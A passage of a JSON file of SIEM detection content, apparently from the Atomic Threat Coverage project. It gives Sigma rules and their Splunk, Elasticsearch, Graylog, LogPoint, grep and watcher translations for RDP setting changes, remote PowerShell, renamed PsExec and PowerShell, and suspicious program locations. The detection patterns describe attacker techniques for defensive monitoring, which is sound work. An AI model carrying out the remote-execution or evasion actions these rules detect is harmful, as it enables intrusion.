Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\WinStations\\\\\\\\RDP-Tcp\\\\\\\\UserAuthentication\" OR TargetObject=\"*\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fDenyTSConnections\") Details=\"DWORD (0x00000000)\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\WinStations\\\\\\\\RDP-Tcp\\\\\\\\UserAuthentication\", \"*\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fDenyTSConnections\"] Details=\"DWORD (0x00000000)\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\UserAuthentication|.*.*\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\fDenyTSConnections))(?=.*DWORD \\\\(0x00000000\\\\)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: RDP Sensitive Settings Changed\nid: 171b67e1-74b4-460e-8d55-b331f3e32d67\ndescription: Detects changes to RDP terminal service sensitive settings\nreferences:\n    - https://blog.menasec.net/2019/02/threat-hunting-rdp-hijacking-via.html\ndate: 2019/04/03\nauthor: Samir Bousseaden\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_reg:\n        EventID: 13\n        TargetObject:\n            - '*\\services\\TermService\\Parameters\\ServiceDll*'\n            - '*\\Control\\Terminal Server\\fSingleSessionPerUser*'\n            - '*\\Control\\Terminal Server\\fDenyTSConnections*'\n    condition: selection_reg\ntags:\n    - attack.defense_evasion\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\services\\\\\\\\TermService\\\\\\\\Parameters\\\\\\\\ServiceDll* OR *\\\\\\\\Control\\\\\\\\Terminal\\\\ Server\\\\\\\\fSingleSessionPerUser* OR *\\\\\\\\Control\\\\\\\\Terminal\\\\ Server\\\\\\\\fDenyTSConnections*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/RDP-Sensitive-Settings-Changed <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"RDP Sensitive Settings Changed\",\\n    \"description\": \"Detects changes to RDP terminal service sensitive settings\",\\n    \"tags\": [\\n      \"attack.defense_evasion\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\services\\\\\\\\\\\\\\\\TermService\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\ServiceDll* OR *\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Terminal\\\\\\\\ Server\\\\\\\\\\\\\\\\fSingleSessionPerUser* OR *\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Terminal\\\\\\\\ Server\\\\\\\\\\\\\\\\fDenyTSConnections*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\services\\\\\\\\\\\\\\\\TermService\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\ServiceDll* OR *\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Terminal\\\\\\\\ Server\\\\\\\\\\\\\\\\fSingleSessionPerUser* OR *\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Terminal\\\\\\\\ Server\\\\\\\\\\\\\\\\fDenyTSConnections*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'RDP Sensitive Settings Changed\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\services\\\\\\\\TermService\\\\\\\\Parameters\\\\\\\\ServiceDll* *\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fSingleSessionPerUser* *\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fDenyTSConnections*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*\\\\\\\\services\\\\\\\\TermService\\\\\\\\Parameters\\\\\\\\ServiceDll*\" OR TargetObject=\"*\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fSingleSessionPerUser*\" OR TargetObject=\"*\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fDenyTSConnections*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*\\\\\\\\services\\\\\\\\TermService\\\\\\\\Parameters\\\\\\\\ServiceDll*\", \"*\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fSingleSessionPerUser*\", \"*\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\fDenyTSConnections*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\services\\\\TermService\\\\Parameters\\\\ServiceDll.*|.*.*\\\\Control\\\\Terminal Server\\\\fSingleSessionPerUser.*|.*.*\\\\Control\\\\Terminal Server\\\\fDenyTSConnections.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1086 Remote PowerShell Session\nid: c539afac-c12a-46ed-b1bd-5a5567c9f045\ndescription: Detects remote PowerShell seccions by monitoring network outbount connections to ports 5985 or 5986 from not network service account\nstatus: experimental\ndate: 2019/09/12\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/02_execution/T1086_powershell/powershell_remote_session.md\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection: \n        EventID: 3\n        DestinationPort:\n            - 5985\n            - 5986\n    filter:\n        User: 'NT AUTHORITY\\NETWORK SERVICE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"3\" AND DestinationPort:(\"5985\" OR \"5986\")) AND (NOT (User:\"NT\\\\ AUTHORITY\\\\\\\\NETWORK\\\\ SERVICE\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1086-Remote-PowerShell-Session <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1086 Remote PowerShell Session\",\\n    \"description\": \"Detects remote PowerShell seccions by monitoring network outbount connections to ports 5985 or 5986 from not network service account\",\\n    \"tags\": \"\",\\n    \"query\": \"((EventID:\\\\\"3\\\\\" AND DestinationPort:(\\\\\"5985\\\\\" OR \\\\\"5986\\\\\")) AND (NOT (User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\NETWORK\\\\\\\\ SERVICE\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"3\\\\\" AND DestinationPort:(\\\\\"5985\\\\\" OR \\\\\"5986\\\\\")) AND (NOT (User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\NETWORK\\\\\\\\ SERVICE\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1086 Remote PowerShell Session\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"3\" AND DestinationPort:(\"5985\" \"5986\")) AND (NOT (User:\"NT AUTHORITY\\\\\\\\NETWORK SERVICE\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"3\" (DestinationPort=\"5985\" OR DestinationPort=\"5986\")) NOT (User=\"NT AUTHORITY\\\\\\\\NETWORK SERVICE\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"3\" DestinationPort IN [\"5985\", \"5986\"])  -(User=\"NT AUTHORITY\\\\\\\\NETWORK SERVICE\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*3)(?=.*(?:.*5985|.*5986))))(?=.*(?!.*(?:.*(?=.*NT AUTHORITY\\\\NETWORK SERVICE)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Renamed PowerShell\nid: d178a2d7-129a-4ba4-8ee6-d6e1fecd5d20\nstatus: experimental\ndescription: Detects the execution of a renamed PowerShell often used by attackers or malware\nreferences:\n    - https://twitter.com/christophetd/status/1164506034720952320\nauthor: Florian Roth\ndate: 2019/08/22\ntags:\n    - car.2013-05-009\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        Description: 'Windows PowerShell'\n        Company: 'Microsoft Corporation'\n    filter:\n        Image: \n            - '*\\powershell.exe'\n            - '*\\powershell_ise.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Description:\"Windows\\\\ PowerShell\" AND Company:\"Microsoft\\\\ Corporation\") AND (NOT (Image.keyword:(*\\\\\\\\powershell.exe OR *\\\\\\\\powershell_ise.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Renamed-PowerShell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Renamed PowerShell\",\\n    \"description\": \"Detects the execution of a renamed PowerShell often used by attackers or malware\",\\n    \"tags\": [\\n      \"car.2013-05-009\"\\n    ],\\n    \"query\": \"((Description:\\\\\"Windows\\\\\\\\ PowerShell\\\\\" AND Company:\\\\\"Microsoft\\\\\\\\ Corporation\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\powershell_ise.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Description:\\\\\"Windows\\\\\\\\ PowerShell\\\\\" AND Company:\\\\\"Microsoft\\\\\\\\ Corporation\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\powershell_ise.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Renamed PowerShell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Description:\"Windows PowerShell\" AND Company:\"Microsoft Corporation\") AND (NOT (Image.keyword:(*\\\\\\\\powershell.exe *\\\\\\\\powershell_ise.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Description=\"Windows PowerShell\" Company=\"Microsoft Corporation\") NOT ((Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\powershell_ise.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((Description=\"Windows PowerShell\" Company=\"Microsoft Corporation\")  -(Image IN [\"*\\\\\\\\powershell.exe\", \"*\\\\\\\\powershell_ise.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*Windows PowerShell)(?=.*Microsoft Corporation)))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\powershell\\\\.exe|.*.*\\\\powershell_ise\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Renamed PsExec\nid: a7a7e0e5-1d57-49df-9c58-9fe5bc0346a2\nstatus: experimental\ndescription: Detects the execution of a renamed PsExec often used by attackers or malware\nreferences:\n    - https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/megacortex-ransomware-spotted-attacking-enterprise-networks\nauthor: Florian Roth\ndate: 2019/05/21\ntags:\n    - car.2013-05-009\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        Description: 'Execute processes remotely'\n        Product: 'Sysinternals PsExec'\n    filter:\n        Image:\n           - '*\\PsExec.exe'\n           - '*\\PsExec64.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software that illegaly integrates PsExec in a renamed form\n    - Administrators that have renamed PsExec and no one knows why\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Description:\"Execute\\\\ processes\\\\ remotely\" AND Product:\"Sysinternals\\\\ PsExec\") AND (NOT (Image.keyword:(*\\\\\\\\PsExec.exe OR *\\\\\\\\PsExec64.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Renamed-PsExec <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Renamed PsExec\",\\n    \"description\": \"Detects the execution of a renamed PsExec often used by attackers or malware\",\\n    \"tags\": [\\n      \"car.2013-05-009\"\\n    ],\\n    \"query\": \"((Description:\\\\\"Execute\\\\\\\\ processes\\\\\\\\ remotely\\\\\" AND Product:\\\\\"Sysinternals\\\\\\\\ PsExec\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\PsExec.exe OR *\\\\\\\\\\\\\\\\PsExec64.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Description:\\\\\"Execute\\\\\\\\ processes\\\\\\\\ remotely\\\\\" AND Product:\\\\\"Sysinternals\\\\\\\\ PsExec\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\PsExec.exe OR *\\\\\\\\\\\\\\\\PsExec64.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Renamed PsExec\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Description:\"Execute processes remotely\" AND Product:\"Sysinternals PsExec\") AND (NOT (Image.keyword:(*\\\\\\\\PsExec.exe *\\\\\\\\PsExec64.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Description=\"Execute processes remotely\" Product=\"Sysinternals PsExec\") NOT ((Image=\"*\\\\\\\\PsExec.exe\" OR Image=\"*\\\\\\\\PsExec64.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((Description=\"Execute processes remotely\" Product=\"Sysinternals PsExec\")  -(Image IN [\"*\\\\\\\\PsExec.exe\", \"*\\\\\\\\PsExec64.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*Execute processes remotely)(?=.*Sysinternals PsExec)))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\PsExec\\\\.exe|.*.*\\\\PsExec64\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Program Location with Network Connections\nid: 7b434893-c57d-4f41-908d-6a17bf1ae98f\nstatus: experimental\ndescription: Detects programs with network connections running in suspicious files system locations\nreferences:\n    - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo\nauthor: Florian Roth\ndate: 2017/03/19\nlogsource:\n    product: windows\n    service: sysmon\n    definition: 'Use the following config to generate the necessary Event ID 3 Network Connection events'\ndetection:\n    selection:\n        EventID: 3\n        Image: \n            # - '*\\ProgramData\\\\*'  # too many false positives, e.g. with Webex for Windows\n            - '*\\$Recycle.bin'\n            - '*\\Users\\All Users\\\\*'\n            - '*\\Users\\Default\\\\*'\n            - '*\\Users\\Public\\\\*'\n            - '*\\Users\\Contacts\\\\*'\n            - '*\\Users\\Searches\\\\*' \n            - 'C:\\Perflogs\\\\*'\n            - '*\\config\\systemprofile\\\\*'\n            - '*\\Windows\\Fonts\\\\*'\n            - '*\\Windows\\IME\\\\*'\n            - '*\\Windows\\addins\\\\*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"3\" AND Image.keyword:(*\\\\\\\\$Recycle.bin OR *\\\\\\\\Users\\\\\\\\All\\\\ Users\\\\\\\\* OR *\\\\\\\\Users\\\\\\\\Default\\\\\\\\* OR *\\\\\\\\Users\\\\\\\\Public\\\\\\\\* OR *\\\\\\\\Users\\\\\\\\Contacts\\\\\\\\* OR *\\\\\\\\Users\\\\\\\\Searches\\\\\\\\* OR C\\\\:\\\\\\\\Perflogs\\\\\\\\* OR *\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\IME\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Program-Location-with-Network-Connections <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Program Location with Network Connections\",\\n    \"description\": \"Detects programs with network connections running in suspicious files system locations\",\\n    \"tags\": \"\",\\n    \"query\": \"(EventID:\\\\\"3\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\$Recycle.bin OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\All\\\\\\\\ Users\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Contacts\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Searches\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Perflogs\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\systemprofile\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Fonts\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\IME\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"3\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\$Recycle.bin OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\All\\\\\\\\ Users\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Contacts\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Searches\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Perflogs\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\systemprofile\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Fonts\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\IME\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Program Location with Network Connections\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"3\" AND Image.keyword:(*\\\\\\\\$Recycle.bin *\\\\\\\\Users\\\\\\\\All Users\\\\\\\\* *\\\\\\\\Users\\\\\\\\Default\\\\\\\\* *\\\\\\\\Users\\\\\\\\Public\\\\\\\\* *\\\\\\\\Users\\\\\\\\Contacts\\\\\\\\* *\\\\\\\\Users\\\\\\\\Searches\\\\\\\\* C\\\\:\\\\\\\\Perflogs\\\\\\\\* *\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\* *\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\* *\\\\\\\\Windows\\\\\\\\IME\\\\\\\\* *\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"3\" (Image=\"*\\\\\\\\$Recycle.bin\" OR Image=\"*\\\\\\\\Users\\\\\\\\All Users\\\\\\\\*\" OR Image=\"*\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\" OR Image=\"*\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\" OR Image=\"*\\\\\\\\Users\\\\\\\\Contacts\\\\\\\\*\" OR Image=\"*\\\\\\\\Users\\\\\\\\Searches\\\\\\\\*\" OR Image=\"C:\\\\\\\\Perflogs\\\\\\\\*\" OR Image=\"*\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\IME\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"3\" Image IN [\"*\\\\\\\\$Recycle.bin\", \"*\\\\\\\\Users\\\\\\\\All Users\\\\\\\\*\", \"*\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\", \"*\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\", \"*\\\\\\\\Users\\\\\\\\Contacts\\\\\\\\*\", \"*\\\\\\\\Users\\\\\\\\Searches\\\\\\\\*\", \"C:\\\\\\\\Perflogs\\\\\\\\*\", \"*\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\IME\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*3)(?=.*(?:.*.*\\\\\\\\$Recycle\\\\.bin|.*.*\\\\Users\\\\All Users\\\\\\\\.*|.*.*\\\\Users\\\\Default\\\\\\\\.*|.*.*\\\\Users\\\\Public\\\\\\\\.*|.*.*\\\\Users\\\\Contacts\\\\\\\\.*|.*.*\\\\Users\\\\Searches\\\\\\\\.*|.*C:\\\\Perflogs\\\\\\\\.*|.*.*\\\\config\\\\systemprofile\\\\\\\\.*|.*.*\\\\Windows\\\\Fonts\\\\\\\\.*|.*.*\\\\Windows\\\\IME\\\\\\\\.*|.*.*\\\\Windows\\\\addins\\\\\\\\.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Keyboard Layout Load\nid: 34aa0252-6039-40ff-951f-939fd6ce47d8\ndescription: Detects the keyboard preload installation with a suspicious keyboard layout, e.g. Chinese, Iranian or Vietnamese layout load in user session on systems\n    maintained by US staff only\nreferences:\n    - https://renenyffenegger.ch/notes/Windows/registry/tree/HKEY_CURRENT_USER/Keyboard-Layout/Preload/index\n    - https://github.com/SwiftOnSecurity/sysmon-config/pull/92/files\nauthor: Florian Roth\ndate: 2019/10/12\nmodified: 2019/10/15\nlogsource:\n    product: windows\n    service: sysmon\n    definition: 'Requirements: Sysmon config that monitors \\Keyboard Layout\\Preload subkey of the HKLU hives - see https://github.com/SwiftOnSecurity/sysmon-config/pull/92/files'\ndetection:\n    selection_registry:\n        EventID: 13\n        TargetObject: \n            